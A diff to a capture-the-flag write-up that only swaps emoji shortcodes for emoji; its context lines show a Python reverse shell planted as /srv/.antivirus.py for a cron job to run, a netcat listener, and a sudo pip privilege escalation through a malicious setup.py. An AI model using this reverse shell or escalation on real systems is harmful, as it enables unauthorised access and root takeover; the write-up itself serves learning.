@@ -290,7 +290,7 @@ This looks like it's periodically executed (as of my experience from CTF boxes).
 ```shell
 $ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.20.138",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > /srv/.antivirus.py
 ```
-Listen to it: `nc -lvnp 4444` (on your local machine). And then wait... (mostly ~15min, maybe it is really a cronjob. If not :sob:)
+Listen to it: `nc -lvnp 4444` (on your local machine). And then wait... (mostly ~15min, maybe it is really a cronjob. If not 😭)
 
 ```shell
 listening on [any] 4444 ...
@@ -326,7 +326,7 @@ We see that `devops` is allowed to run `/usr/bin/pip` with no password, that wou
 
 And this took me a long time to find any useful information about it. Googling "pip privilege escalation" brought me to nothing. Finally "sudo pip exploit" brought me the Github repo [FakePip](https://github.com/0x00-0x00/FakePip).
 
-(Yes, I know I was lazy. I could have also read about pip and how it processes files and thinking of writing my own exploit. But meh, you know... :sleepy:)
+(Yes, I know I was lazy. I could have also read about pip and how it processes files and thinking of writing my own exploit. But meh, you know... 😪)
 
 There we see that a "malicious" (let's call it that way) `setup.py` is being processed by **pip**. This will run also commands inside of `setup.py`. 
 
@@ -399,4 +399,4 @@ We have the last flag! This worked because `pip` has been run with sudo privileg
 
 The machine was a nice and short trip. Gaining access as user was not that hard, but finding the way to exploit `pip` was fun. I knew that `pip` runs setup routines, but not how to abuse them.
 
-Nice work @xMagass! Looking forward to your next boxes! :smile:
+Nice work @xMagass! Looking forward to your next boxes! 😄
